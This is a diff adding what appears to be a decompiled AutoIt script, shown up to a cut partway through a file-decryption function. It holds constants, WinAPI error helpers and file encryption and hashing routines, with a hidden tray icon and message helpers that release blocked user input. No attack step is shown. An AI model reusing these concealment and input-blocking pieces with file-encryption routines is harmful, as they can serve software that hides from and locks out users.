@@ -1,0 +1,1553 @@
+#NoTrayIcon
+Global Const $fc_nooverwrite = 0x0
+Global Const $fc_overwrite = 0x1
+Global Const $fc_createpath = 0x8
+Global Const $ft_modified = 0x0
+Global Const $ft_created = 0x1
+Global Const $ft_accessed = 0x2
+Global Const $ft_array = 0x0
+Global Const $ft_string = 0x1
+Global Const $ft_msec = 0x2
+Global Const $ft_utc = 0x4
+Global Const $fsf_createbutton = 0x1
+Global Const $fsf_newdialog = 0x2
+Global Const $fsf_editcontrol = 0x4
+Global Const $ft_nonrecursive = 0x0
+Global Const $ft_recursive = 0x1
+Global Const $fo_read = 0x0
+Global Const $fo_append = 0x1
+Global Const $fo_overwrite = 0x2
+Global Const $fo_createpath = 0x8
+Global Const $fo_binary = 0x10
+Global Const $fo_unicode = 0x20
+Global Const $fo_utf16_le = 0x20
+Global Const $fo_utf16_be = 0x40
+Global Const $fo_utf8 = 0x80
+Global Const $fo_utf8_nobom = 0x100
+Global Const $fo_ansi = 0x200
+Global Const $fo_utf16_le_nobom = 0x400
+Global Const $fo_utf16_be_nobom = 0x800
+Global Const $fo_utf8_full = 0x4000
+Global Const $fo_fullfile_detect = 0x4000
+Global Const $eof = +0xffffffff
+Global Const $fd_filemustexist = 0x1
+Global Const $fd_pathmustexist = 0x2
+Global Const $fd_multiselect = 0x4
+Global Const $fd_promptcreatenew = 0x8
+Global Const $fd_promptoverwrite = 0x10
+Global Const $create_new = 0x1
+Global Const $create_always = 0x2
+Global Const $open_existing = 0x3
+Global Const $open_always = 0x4
+Global Const $truncate_existing = 0x5
+Global Const $invalid_set_file_pointer = +0xffffffff
+Global Const $file_begin = 0x0
+Global Const $file_current = 0x1
+Global Const $file_end = 0x2
+Global Const $file_attribute_readonly = 0x1
+Global Const $file_attribute_hidden = 0x2
+Global Const $file_attribute_system = 0x4
+Global Const $file_attribute_directory = 0x10
+Global Const $file_attribute_archive = 0x20
+Global Const $file_attribute_device = 0x40
+Global Const $file_attribute_normal = 0x80
+Global Const $file_attribute_temporary = 0x100
+Global Const $file_attribute_sparse_file = 0x200
+Global Const $file_attribute_reparse_point = 0x400
+Global Const $file_attribute_compressed = 0x800
+Global Const $file_attribute_offline = 0x1000
+Global Const $file_attribute_not_content_indexed = 0x2000
+Global Const $file_attribute_encrypted = 0x4000
+Global Const $file_share_read = 0x1
+Global Const $file_share_write = 0x2
+Global Const $file_share_delete = 0x4
+Global Const $file_share_readwrite = BitOR($file_share_read, $file_share_write)
+Global Const $file_share_any = BitOR($file_share_read, $file_share_write, $file_share_delete)
+Global Const $generic_all = 0x10000000
+Global Const $generic_execute = 0x20000000
+Global Const $generic_write = 0x40000000
+Global Const $generic_read = 0x80000000
+Global Const $generic_readwrite = BitOR($generic_read, $generic_write)
+Global Const $file_encoding_utf16le = 0x20
+Global Const $fe_entire_utf8 = 0x1
+Global Const $fe_partialfirst_utf8 = 0x2
+Global Const $fn_fullpath = 0x0
+Global Const $fn_relativepath = 0x1
+Global Const $fv_comments = "Comments"
+Global Const $fv_companyname = "CompanyName"
+Global Const $fv_filedescription = "FileDescription"
+Global Const $fv_fileversion = "FileVersion"
+Global Const $fv_internalname = "InternalName"
+Global Const $fv_legalcopyright = "LegalCopyright"
+Global Const $fv_legaltrademarks = "LegalTrademarks"
+Global Const $fv_originalfilename = "OriginalFilename"
+Global Const $fv_productname = "ProductName"
+Global Const $fv_productversion = "ProductVersion"
+Global Const $fv_privatebuild = "PrivateBuild"
+Global Const $fv_specialbuild = "SpecialBuild"
+Global Const $frta_nocount = 0x0
+Global Const $frta_count = 0x1
+Global Const $frta_intarrays = 0x2
+Global Const $frta_entiresplit = 0x4
+Global Const $flta_filesfolders = 0x0
+Global Const $flta_files = 0x1
+Global Const $flta_folders = 0x2
+Global Const $fltar_filesfolders = 0x0
+Global Const $fltar_files = 0x1
+Global Const $fltar_folders = 0x2
+Global Const $fltar_nohidden = 0x4
+Global Const $fltar_nosystem = 0x8
+Global Const $fltar_nolink = 0x10
+Global Const $fltar_norecur = 0x0
+Global Const $fltar_recur = 0x1
+Global Const $fltar_nosort = 0x0
+Global Const $fltar_sort = 0x1
+Global Const $fltar_fastsort = 0x2
+Global Const $fltar_nopath = 0x0
+Global Const $fltar_relpath = 0x1
+Global Const $fltar_fullpath = 0x2
+Global Const $path_original = 0x0
+Global Const $path_drive = 0x1
+Global Const $path_directory = 0x2
+Global Const $path_filename = 0x3
+Global Const $path_extension = 0x4
+Global Const $mb_ok = 0x0
+Global Const $mb_okcancel = 0x1
+Global Const $mb_abortretryignore = 0x2
+Global Const $mb_yesnocancel = 0x3
+Global Const $mb_yesno = 0x4
+Global Const $mb_retrycancel = 0x5
+Global Const $mb_canceltrycontinue = 0x6
+Global Const $mb_help = 0x4000
+Global Const $mb_iconnone = 0x0
+Global Const $mb_iconstop = 0x10
+Global Const $mb_iconerror = 0x10
+Global Const $mb_iconhand = 0x10
+Global Const $mb_iconquestion = 0x20
+Global Const $mb_iconexclamation = 0x30
+Global Const $mb_iconwarning = 0x30
+Global Const $mb_iconinformation = 0x40
+Global Const $mb_iconasterisk = 0x40
+Global Const $mb_usericon = 0x80
+Global Const $mb_defbutton1 = 0x0
+Global Const $mb_defbutton2 = 0x100
+Global Const $mb_defbutton3 = 0x200
+Global Const $mb_defbutton4 = 0x300
+Global Const $mb_applmodal = 0x0
+Global Const $mb_systemmodal = 0x1000
+Global Const $mb_taskmodal = 0x2000
+Global Const $mb_default_desktop_only = 0x20000
+Global Const $mb_right = 0x80000
+Global Const $mb_rtlreading = 0x100000
+Global Const $mb_setforeground = 0x10000
+Global Const $mb_topmost = 0x40000
+Global Const $mb_service_notification = 0x200000
+Global Const $mb_rightjustified = $mb_right
+Global Const $idtimeout = +0xffffffff
+Global Const $idok = 0x1
+Global Const $idcancel = 0x2
+Global Const $idabort = 0x3
+Global Const $idretry = 0x4
+Global Const $idignore = 0x5
+Global Const $idyes = 0x6
+Global Const $idno = 0x7
+Global Const $idclose = 0x8
+Global Const $idhelp = 0x9
+Global Const $idtryagain = 0xa
+Global Const $idcontinue = 0xb
+Global Const $str_nocasesense = 0x0
+Global Const $str_casesense = 0x1
+Global Const $str_nocasesensebasic = 0x2
+Global Const $str_stripleading = 0x1
+Global Const $str_striptrailing = 0x2
+Global Const $str_stripspaces = 0x4
+Global Const $str_stripall = 0x8
+Global Const $str_chrsplit = 0x0
+Global Const $str_entiresplit = 0x1
+Global Const $str_nocount = 0x2
+Global Const $str_regexpmatch = 0x0
+Global Const $str_regexparraymatch = 0x1
+Global Const $str_regexparrayfullmatch = 0x2
+Global Const $str_regexparrayglobalmatch = 0x3
+Global Const $str_regexparrayglobalfullmatch = 0x4
+Global Const $str_endisstart = 0x0
+Global Const $str_endnotstart = 0x1
+Global Const $sb_ansi = 0x1
+Global Const $sb_utf16le = 0x2
+Global Const $sb_utf16be = 0x3
+Global Const $sb_utf8 = 0x4
+Global Const $se_utf16 = 0x0
+Global Const $se_ansi = 0x1
+Global Const $se_utf8 = 0x2
+Global Const $str_utf16 = 0x0
+Global Const $str_ucs2 = 0x1
+#Region Global Variables and Constants
+Global Const $format_message_allocate_buffer = 0x100
+Global Const $format_message_ignore_inserts = 0x200
+Global Const $format_message_from_string = 0x400
+Global Const $format_message_from_hmodule = 0x800
+Global Const $format_message_from_system = 0x1000
+Global Const $format_message_argument_array = 0x2000
+#EndRegion Global Variables and Constants
+Func _WinAPI_Beep($ifreq = 0x1f4, $iduration = 0x3e8)
+    Local $acall = DllCall("kernel32.dll", "bool", "Beep", "dword", $ifreq, "dword", $iduration)
+    If @error Then Return SetError(@error, @extended, False)
+    Return $acall[0x0]
+EndFunc   ;==>_WINAPI_BEEP
+Func _WinAPI_FormatMessage($iflags, $psource, $imessageid, $ilanguageid, ByRef $pbuffer, $isize, $varguments)
+    Local $sbuffertype = "struct*"
+    If IsString($pbuffer) Then $sbuffertype = "wstr"
+    Local $acall = DllCall("kernel32.dll", "dword", "FormatMessageW", "dword", $iflags, "struct*", $psource, "dword", $imessageid, "dword", $ilanguageid, $sbuffertype, $pbuffer, "dword", $isize, "ptr", $varguments)
+    If @error Then Return SetError(@error, @extended, 0x0)
+    If Not $acall[0x0] Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
+    If $sbuffertype = "wstr" Then $pbuffer = $acall[0x5]
+    Return $acall[0x0]
+EndFunc   ;==>_WINAPI_FORMATMESSAGE
+Func _WinAPI_GetErrorMessage($icode, $ilanguage = 0x0, Const $_icallererror = @error, Const $_icallerextended = @extended)
+    Local $acall = DllCall("kernel32.dll", "dword", "FormatMessageW", "dword", BitOR($format_message_from_system, $format_message_ignore_inserts), "ptr", 0x0, "dword", $icode, "dword", $ilanguage, "wstr", "", "dword", 0x1000, "ptr", 0x0)
+    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, "")
+    Return SetError($_icallererror, $_icallerextended, StringRegExpReplace($acall[0x5], "[" & @LF & "," & @CR & "]*\Z", ""))
+EndFunc   ;==>_WINAPI_GETERRORMESSAGE
+Func _WinAPI_GetLastError(Const $_icallererror = @error, Const $_icallerextended = @extended)
+    Local $acall = DllCall("kernel32.dll", "dword", "GetLastError")
+    Return SetError($_icallererror, $_icallerextended, $acall[0x0])
+EndFunc   ;==>_WINAPI_GETLASTERROR
+Func _WinAPI_GetLastErrorMessage(Const $_icallererror = @error, Const $_icallerextended = @extended)
+    Local $ilasterror = _WinAPI_GetLastError()
+    Local $tbufferptr = DllStructCreate("ptr")
+    Local $ncount = _WinAPI_FormatMessage(BitOR($format_message_allocate_buffer, $format_message_from_system, $format_message_ignore_inserts), 0x0, $ilasterror, 0x0, $tbufferptr, 0x0, 0x0)
+    If @error Then Return SetError(-@error, @extended, "")
+    Local $stext = ""
+    Local $pbuffer = DllStructGetData($tbufferptr, 0x1)
+    If $pbuffer Then
+        If $ncount > 0x0 Then
+            Local $tbuffer = DllStructCreate("wchar[" & ($ncount + 0x1) & "]", $pbuffer)
+            $stext = DllStructGetData($tbuffer, 0x1)
+            If StringRight($stext, 0x2) = @CRLF Then $stext = StringTrimRight($stext, 0x2)
+        EndIf
+        DllCall("kernel32.dll", "handle", "LocalFree", "handle", $pbuffer)
+    EndIf
+    Return SetError($_icallererror, $_icallerextended, $stext)
+EndFunc   ;==>_WINAPI_GETLASTERRORMESSAGE
+Func _WinAPI_MessageBeep($itype = 0x1)
+    Local $isound
+    Switch $itype
+        Case 0x1
+            $isound = 0x0
+        Case 0x2
+            $isound = 0x10
+        Case 0x3
+            $isound = 0x20
+        Case 0x4
+            $isound = 0x30
+        Case 0x5
+            $isound = 0x40
+        Case Else
+            $isound = +0xffffffff
+    EndSwitch
+    Local $acall = DllCall("user32.dll", "bool", "MessageBeep", "uint", $isound)
+    If @error Then Return SetError(@error, @extended, False)
+    Return $acall[0x0]
+EndFunc   ;==>_WINAPI_MESSAGEBEEP
+Func _WinAPI_MsgBox($iflags, $stitle, $stext)
+    BlockInput(0x0)
+    MsgBox($iflags, $stitle, $stext & "      ")
+EndFunc   ;==>_WINAPI_MSGBOX
+Func _WinAPI_SetLastError($ierrorcode, Const $_icallererror = @error, Const $_icallerextended = @extended)
+    DllCall("kernel32.dll", "none", "SetLastError", "dword", $ierrorcode)
+    Return SetError($_icallererror, $_icallerextended, Null)
+EndFunc   ;==>_WINAPI_SETLASTERROR
+Func _WinAPI_ShowError($stext, $bexit = True)
+    BlockInput(0x0)
+    MsgBox($mb_systemmodal, "Error", $stext & "      ")
+    If $bexit Then Exit
+EndFunc   ;==>_WINAPI_SHOWERROR
+Func _WinAPI_ShowLastError($stext = "", $babort = False, $ilanguage = 0x0, Const $_icallererror = @error, Const $_icallerextended = @extended)
+    Local $serror
+    Local $ilasterror = _WinAPI_GetLastError()
+    While 0x1
+        $serror = _WinAPI_GetErrorMessage($ilasterror, $ilanguage)
+        If @error And $ilanguage Then
+            $ilanguage = 0x0
+        Else
+            ExitLoop
+        EndIf
+    WEnd
+    If StringStripWS($stext, $str_stripleading + $str_striptrailing) Then
+        $stext &= @CRLF & @CRLF
+    Else
+        $stext = ""
+    EndIf
+    _WinAPI_MsgBox(BitOR(0x40000, BitShift(0x10, +0xfffffffe * (Not $ilasterror))), $ilasterror, $stext & $serror)
+    If $ilasterror Then
+        _WinAPI_SetLastError($ilasterror)
+        If $babort Then
+            Exit $ilasterror
+        EndIf
+    EndIf
+    Return SetError($_icallererror, $_icallerextended, 0x1)
+EndFunc   ;==>_WINAPI_SHOWLASTERROR
+Func _WinAPI_ShowMsg($stext)
+    _WinAPI_MsgBox($mb_systemmodal, "Information", $stext)
+EndFunc   ;==>_WINAPI_SHOWMSG
+Func __COMERRORFORMATING(ByRef $ocomerror, $sprefix = @TAB)
+    Local Const $str_striptrailing = 0x2
+    Local $serror = "COM Error encountered in " & @ScriptName & " (" & $ocomerror .Scriptline & ") :" & @CRLF & $sprefix & "Number        " & @TAB & "= 0x" & Hex($ocomerror .Number, 0x8) & " (" & $ocomerror .Number & ")" & @CRLF & $sprefix & "WinDescription" & @TAB & "= " & StringStripWS($ocomerror .WinDescription, $str_striptrailing) & @CRLF & $sprefix & "Description   " & @TAB & "= " & StringStripWS($ocomerror .Description, $str_striptrailing) & @CRLF & $sprefix & "Source        " & @TAB & "= " & $ocomerror .Source & @CRLF & $sprefix & "HelpFile      " & @TAB & "= " & $ocomerror .HelpFile & @CRLF & $sprefix & "HelpContext   " & @TAB & "= " & $ocomerror .HelpContext & @CRLF & $sprefix & "LastDllError  " & @TAB & "= " & $ocomerror .LastDllError & @CRLF & $sprefix & "Retcode       " & @TAB & "= 0x" & Hex($ocomerror .retcode)
+    Return $serror
+EndFunc   ;==>__COMERRORFORMATING
+Global Const $prov_rsa_full = 0x1
+Global Const $prov_rsa_aes = 0x18
+Global Const $crypt_verifycontext = 0xf0000000
+Global Const $hp_hashsize = 0x4
+Global Const $hp_hashval = 0x2
+Global Const $crypt_exportable = 0x1
+Global Const $crypt_userdata = 0x1
+Global Const $kp_algid = 0x7
+Global Const $calg_md2 = 0x8001
+Global Const $calg_md4 = 0x8002
+Global Const $calg_md5 = 0x8003
+Global Const $calg_sha1 = 0x8004
+Global Const $calg_sha_256 = 0x800c
+Global Const $calg_sha_384 = 0x800d
+Global Const $calg_sha_512 = 0x800e
+Global Const $calg_3des = 0x6603
+Global Const $calg_aes_128 = 0x660e
+Global Const $calg_aes_192 = 0x660f
+Global Const $calg_aes_256 = 0x6610
+Global Const $calg_des = 0x6601
+Global Const $calg_rc2 = 0x6602
+Global Const $calg_rc4 = 0x6801
+Global Const $calg_userkey = 0x0
+Global $__g_acryptinternaldata[0x3]
+Func _Crypt_Startup()
+    If __CRYPT_REFCOUNT() = 0x0 Then
+        Local $hadvapi32 = DllOpen("Advapi32.dll")
+        If $hadvapi32 = +0xffffffff Then Return SetError(0x3e9, 0x0, False)
+        __CRYPT_DLLHANDLESET($hadvapi32)
+        Local $iproviderid = $prov_rsa_aes
+        Local $acall = DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptAcquireContext", "handle*", 0x0, "ptr", 0x0, "ptr", 0x0, "dword", $iproviderid, "dword", $crypt_verifycontext)
+        If @error Or Not $acall[0x0] Then
+            Local $ierror = @error + 0x3ea, $iextended = @extended
+            If Not $acall[0x0] Then $iextended = _WinAPI_GetLastError()
+            DllClose(__CRYPT_DLLHANDLE())
+            Return SetError($ierror, $iextended, False)
+        Else
+            __CRYPT_CONTEXTSET($acall[0x1])
+        EndIf
+    EndIf
+    __CRYPT_REFCOUNTINC()
+    Return True
+EndFunc   ;==>_CRYPT_STARTUP
+Func _Crypt_Shutdown()
+    __CRYPT_REFCOUNTDEC()
+    If __CRYPT_REFCOUNT() = 0x0 Then
+        DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptReleaseContext", "handle", __CRYPT_CONTEXT(), "dword", 0x0)
+        DllClose(__CRYPT_DLLHANDLE())
+    EndIf
+EndFunc   ;==>_CRYPT_SHUTDOWN
+Func _Crypt_DeriveKey($vpassword, $ialgid, $ihashpasswordid = $calg_md5)
+    Local $acall, $tbuff = 0x0, $hcrypthash = 0x0, $ierror = 0x0, $iextended = 0x0, $vreturn = 0x0
+    _Crypt_Startup()
+    If @error Then Return SetError(@error, @extended, +0xffffffff)
+    Do
+        $acall = DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptCreateHash", "handle", __CRYPT_CONTEXT(), "uint", $ihashpasswordid, "ptr", 0x0, "dword", 0x0, "handle*", 0x0)
+        If @error Or Not $acall[0x0] Then
+            $ierror = @error + 0xa
+            $iextended = @extended
+            If Not $acall[0x0] Then $iextended = _WinAPI_GetLastError()
+            $vreturn = +0xffffffff
+            ExitLoop
+        EndIf
+        $hcrypthash = $acall[0x5]
+        $tbuff = DllStructCreate("byte[" & BinaryLen($vpassword) & "]")
+        DllStructSetData($tbuff, 0x1, $vpassword)
+        $acall = DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptHashData", "handle", $hcrypthash, "struct*", $tbuff, "dword", DllStructGetSize($tbuff), "dword", $crypt_userdata)
+        If @error Or Not $acall[0x0] Then
+            $ierror = @error + 0x14
+            $iextended = @extended
+            If Not $acall[0x0] Then $iextended = _WinAPI_GetLastError()
+            $vreturn = +0xffffffff
+            ExitLoop
+        EndIf
+        $acall = DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptDeriveKey", "handle", __CRYPT_CONTEXT(), "uint", $ialgid, "handle", $hcrypthash, "dword", $crypt_exportable, "handle*", 0x0)
+        If @error Or Not $acall[0x0] Then
+            $ierror = @error + 0x1e
+            $iextended = @extended
+            If Not $acall[0x0] Then $iextended = _WinAPI_GetLastError()
+            $vreturn = +0xffffffff
+            ExitLoop
+        EndIf
+        $vreturn = $acall[0x5]
+    Until True
+    If $hcrypthash <> 0x0 Then DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptDestroyHash", "handle", $hcrypthash)
+    Return SetError($ierror, $iextended, $vreturn)
+EndFunc   ;==>_CRYPT_DERIVEKEY
+Func _Crypt_DestroyKey($hcryptkey)
+    Local $acall = DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptDestroyKey", "handle", $hcryptkey)
+    Local $ierror = @error
+    If $ierror Or Not $acall[0x0] Then
+        Return SetError($ierror + 0xa, _WinAPI_GetLastError(), False)
+    Else
+        _Crypt_Shutdown()
+        Return True
+    EndIf
+EndFunc   ;==>_CRYPT_DESTROYKEY
+Func _Crypt_EncryptData($vdata, $vcryptkey, $ialgid, $bfinal = True)
+    Switch $ialgid
+        Case $calg_userkey
+            Local $icalgused = __CRYPT_GETCALGFROMCRYPTKEY($vcryptkey)
+            If @error Then Return SetError(@error, @extended, +0xffffffff)
+            If $icalgused = $calg_rc4 Then ContinueCase
+        Case $calg_rc4
+            If BinaryLen($vdata) = 0x0 Then Return SetError(0x0, 0x0, Binary(""))
+    EndSwitch
+    Local $ireqbuffsize = 0x0, $acall, $tbuff = 0x0, $ierror = 0x0, $iextended = 0x0, $vreturn = 0x0
+    _Crypt_Startup()
+    If @error Then Return SetError(@error, @extended, +0xffffffff)
+    Do
+        If $ialgid <> $calg_userkey Then
+            $vcryptkey = _Crypt_DeriveKey($vcryptkey, $ialgid)
+            If @error Then
+                $ierror = @error
+                $iextended = @extended
+                $vreturn = +0xffffffff
+                ExitLoop
+            EndIf
+        EndIf
+        $acall = DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptEncrypt", "handle", $vcryptkey, "handle", 0x0, "bool", $bfinal, "dword", 0x0, "ptr", 0x0, "dword*", BinaryLen($vdata), "dword", 0x0)
+        If @error Or Not $acall[0x0] Then
+            $ierror = @error + 0x32
+            $iextended = @extended
+            If Not $acall[0x0] Then $iextended = _WinAPI_GetLastError()
+            $vreturn = +0xffffffff
+            ExitLoop
+        EndIf
+        $ireqbuffsize = $acall[0x6]
+        $tbuff = DllStructCreate("byte[" & $ireqbuffsize + 0x1 & "]")
+        DllStructSetData($tbuff, 0x1, $vdata)
+        $acall = DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptEncrypt", "handle", $vcryptkey, "handle", 0x0, "bool", $bfinal, "dword", 0x0, "struct*", $tbuff, "dword*", BinaryLen($vdata), "dword", $ireqbuffsize)
+        If @error Or Not $acall[0x0] Then
+            $ierror = @error + 0x3c
+            $iextended = @extended
+            If Not $acall[0x0] Then $iextended = _WinAPI_GetLastError()
+            $vreturn = +0xffffffff
+            ExitLoop
+        EndIf
+        $vreturn = BinaryMid(DllStructGetData($tbuff, 0x1), 0x1, $ireqbuffsize)
+    Until True
+    If $ialgid <> $calg_userkey Then _Crypt_DestroyKey($vcryptkey)
+    _Crypt_Shutdown()
+    Return SetError($ierror, $iextended, $vreturn)
+EndFunc   ;==>_CRYPT_ENCRYPTDATA
+Func _Crypt_DecryptData($vdata, $vcryptkey, $ialgid, $bfinal = True)
+    Switch $ialgid
+        Case $calg_userkey
+            Local $icalgused = __CRYPT_GETCALGFROMCRYPTKEY($vcryptkey)
+            If @error Then Return SetError(@error, @extended, +0xffffffff)
+            If $icalgused = $calg_rc4 Then ContinueCase
+        Case $calg_rc4
+            If BinaryLen($vdata) = 0x0 Then Return SetError(0x0, 0x0, Binary(""))
+    EndSwitch
+    Local $acall, $tbuff = 0x0, $ttempstruct = 0x0, $ierror = 0x0, $iextended = 0x0, $iplaintextsize = 0x0, $vreturn = 0x0
+    _Crypt_Startup()
+    If @error Then Return SetError(@error, @extended, +0xffffffff)
+    Do
+        If $ialgid <> $calg_userkey Then
+            $vcryptkey = _Crypt_DeriveKey($vcryptkey, $ialgid)
+            If @error Then
+                $ierror = @error
+                $iextended = @extended
+                $vreturn = +0xffffffff
+                ExitLoop
+            EndIf
+        EndIf
+        $tbuff = DllStructCreate("byte[" & BinaryLen($vdata) + 0x3e8 & "]")
+        If BinaryLen($vdata) > 0x0 Then DllStructSetData($tbuff, 0x1, $vdata)
+        $acall = DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptDecrypt", "handle", $vcryptkey, "handle", 0x0, "bool", $bfinal, "dword", 0x0, "struct*", $tbuff, "dword*", BinaryLen($vdata))
+        If @error Or Not $acall[0x0] Then
+            $ierror = @error + 0x46
+            $iextended = @extended
+            If Not $acall[0x0] Then $iextended = _WinAPI_GetLastError()
+            $vreturn = +0xffffffff
+            ExitLoop
+        EndIf
+        $iplaintextsize = $acall[0x6]
+        $ttempstruct = DllStructCreate("byte[" & $iplaintextsize + 0x1 & "]", DllStructGetPtr($tbuff))
+        $vreturn = BinaryMid(DllStructGetData($ttempstruct, 0x1), 0x1, $iplaintextsize)
+    Until True
+    If $ialgid <> $calg_userkey Then _Crypt_DestroyKey($vcryptkey)
+    _Crypt_Shutdown()
+    Return SetError($ierror, $iextended, $vreturn)
+EndFunc   ;==>_CRYPT_DECRYPTDATA
+Func _Crypt_HashData($vdata, $ialgid, $bfinal = True, $hcrypthash = 0x0)
+    Local $acall, $tbuff = 0x0, $ierror = 0x0, $iextended = 0x0, $ihashsize = 0x0, $vreturn = 0x0
+    _Crypt_Startup()
+    If @error Then Return SetError(@error, @extended, +0xffffffff)
+    Do
+        If $hcrypthash = 0x0 Then
+            $acall = DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptCreateHash", "handle", __CRYPT_CONTEXT(), "uint", $ialgid, "ptr", 0x0, "dword", 0x0, "handle*", 0x0)
+            If @error Or Not $acall[0x0] Then
+                $ierror = @error + 0xa
+                $iextended = @extended
+                If Not $acall[0x0] Then $iextended = _WinAPI_GetLastError()
+                $vreturn = +0xffffffff
+                ExitLoop
+            EndIf
+            $hcrypthash = $acall[0x5]
+        EndIf
+        $tbuff = DllStructCreate("byte[" & BinaryLen($vdata) & "]")
+        DllStructSetData($tbuff, 0x1, $vdata)
+        $acall = DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptHashData", "handle", $hcrypthash, "struct*", $tbuff, "dword", DllStructGetSize($tbuff), "dword", $crypt_userdata)
+        If @error Or Not $acall[0x0] Then
+            $ierror = @error + 0x14
+            $iextended = @extended
+            If Not $acall[0x0] Then $iextended = _WinAPI_GetLastError()
+            $vreturn = +0xffffffff
+            ExitLoop
+        EndIf
+        If $bfinal Then
+            $acall = DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptGetHashParam", "handle", $hcrypthash, "dword", $hp_hashsize, "dword*", 0x0, "dword*", 0x4, "dword", 0x0)
+            If @error Or Not $acall[0x0] Then
+                $ierror = @error + 0x1e
+                $iextended = @extended
+                If Not $acall[0x0] Then $iextended = _WinAPI_GetLastError()
+                $vreturn = +0xffffffff
+                ExitLoop
+            EndIf
+            $ihashsize = $acall[0x3]
+            $tbuff = DllStructCreate("byte[" & $ihashsize & "]")
+            $acall = DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptGetHashParam", "handle", $hcrypthash, "dword", $hp_hashval, "struct*", $tbuff, "dword*", $ihashsize, "dword", 0x0)
+            If @error Or Not $acall[0x0] Then
+                $ierror = @error + 0x28
+                $iextended = @extended
+                If Not $acall[0x0] Then $iextended = _WinAPI_GetLastError()
+                $vreturn = +0xffffffff
+                ExitLoop
+            EndIf
+            $vreturn = DllStructGetData($tbuff, 0x1)
+        Else
+            $vreturn = $hcrypthash
+        EndIf
+    Until True
+    If $hcrypthash <> 0x0 And $bfinal Then DllCall(__CRYPT_DLLHANDLE(), "bool", "CryptDestroyHash", "handle", $hcrypthash)
+    _Crypt_Shutdown()
+    Return SetError($ierror, $iextended, $vreturn)
+EndFunc   ;==>_CRYPT_HASHDATA
+Func _Crypt_HashFile($sfilepath, $ialgid)
+    Local $dtempdata = 0x0, $hfile = 0x0, $hhashobject = 0x0, $ierror = 0x0, $iextended = 0x0, $vreturn = 0x0
+    _Crypt_Startup()
+    If @error Then Return SetError(@error, @extended, +0xffffffff)
+    Do
+        $hfile = FileOpen($sfilepath, $fo_binary)
+        If $hfile = +0xffffffff Then
+            $ierror = 0x1
+            $iextended = _WinAPI_GetLastError()
+            $vreturn = +0xffffffff
+            ExitLoop
+        EndIf
+        Do
+            $dtempdata = FileRead($hfile, 0x200 * 0x400)
+            If @error Then
+                $vreturn = _Crypt_HashData($dtempdata, $ialgid, True, $hhashobject)
+                If @error Then
+                    $ierror = @error
+                    $iextended = @extended
+                    $vreturn = +0xffffffff
+                    ExitLoop 0x2
+                EndIf
+                ExitLoop 0x2
+            Else
+                $hhashobject = _Crypt_HashData($dtempdata, $ialgid, False, $hhashobject)
+                If @error Then
+                    $ierror = @error + 0x64
+                    $iextended = @extended
+                    $vreturn = +0xffffffff
+                    ExitLoop 0x2
+                EndIf
+            EndIf
+        Until False
+    Until True
+    _Crypt_Shutdown()
+    If $hfile <> +0xffffffff Then FileClose($hfile)
+    Return SetError($ierror, $iextended, $vreturn)
+EndFunc   ;==>_CRYPT_HASHFILE
+Func _Crypt_EncryptFile($ssourcefile, $sdestinationfile, $vcryptkey, $ialgid)
+    Local $dtempdata = 0x0, $hinfile = 0x0, $houtfile = 0x0, $ierror = 0x0, $iextended = 0x0, $ifilesize = FileGetSize($ssourcefile), $iread = 0x0, $breturn = True
+    _Crypt_Startup()
+    If @error Then Return SetError(@error, @extended, +0xffffffff)
+    Do
+        If $ialgid <> $calg_userkey Then
+            $vcryptkey = _Crypt_DeriveKey($vcryptkey, $ialgid)
+            If @error Then
+                $ierror = @error
+                $iextended = @extended
+                $breturn = False
+                ExitLoop
+            EndIf
+        EndIf
+        $hinfile = FileOpen($ssourcefile, $fo_binary)
+        If $hinfile = +0xffffffff Then
+            $ierror = 0x2
+            $iextended = _WinAPI_GetLastError()
+            $breturn = False
+            ExitLoop
+        EndIf
+        $houtfile = FileOpen($sdestinationfile, $fo_overwrite + $fo_createpath + $fo_binary)
+        If $houtfile = +0xffffffff Then
+            $ierror = 0x3
+            $iextended = _WinAPI_GetLastError()
+            $breturn = False
+            ExitLoop
+        EndIf
+        Do
+            $dtempdata = FileRead($hinfile, 0x400 * 0x400)
+            $iread += BinaryLen($dtempdata)
+            If $iread = $ifilesize Then
+                $dtempdata = _Crypt_EncryptData($dtempdata, $vcryptkey, $calg_userkey, True)
+                If @error Then
+                    $ierror = @error + 0x190
+                    $iextended = @extended
+                    $breturn = False
+                EndIf
+                FileWrite($houtfile, $dtempdata)
+                ExitLoop 0x2
+            Else
+                $dtempdata = _Crypt_EncryptData($dtempdata, $vcryptkey, $calg_userkey, False)
+                If @error Then
+                    $ierror = @error + 0x1f4
+                    $iextended = @extended
+                    $breturn = False
+                    ExitLoop 0x2
+                EndIf
+                FileWrite($houtfile, $dtempdata)
+            EndIf
+        Until False
+    Until True
+    If $ialgid <> $calg_userkey Then _Crypt_DestroyKey($vcryptkey)
+    _Crypt_Shutdown()
+    If $hinfile <> +0xffffffff Then FileClose($hinfile)
+    If $houtfile <> +0xffffffff Then FileClose($houtfile)
+    Return SetError($ierror, $iextended, $breturn)
+EndFunc   ;==>_CRYPT_ENCRYPTFILE
+Func _Crypt_DecryptFile($ssourcefile, $sdestinationfile, $vcryptkey, $ialgid)
+    Local $dtempdata = 0x0, $hinfile = 0x0, $houtfile = 0x0, $ierror = 0x0, $iextended = 0x0, $ifilesize = FileGetSize($ssourcefile), $iread = 0x0, $breturn = True
+    _Crypt_Startup()
+    If @error Then Return SetError(@error, @extended, +0xffffffff)
+    Do
+        If $ialgid <> $calg_userkey Then
+            $vcryptkey = _Crypt_DeriveKey($vcryptkey, $ialgid)
+            If @error Then
+                $ierror = @error
+                $iextended = @extended
+                $breturn = False
+                ExitLoop
+            EndIf
+        EndIf
+        $hinfile = FileOpen($ssourcefile, $fo_binary)
+        If $hinfile = +0xffffffff Then
+            $ierror = 0x2
+            $iextended = _WinAPI_GetLastError()
+            $breturn = False
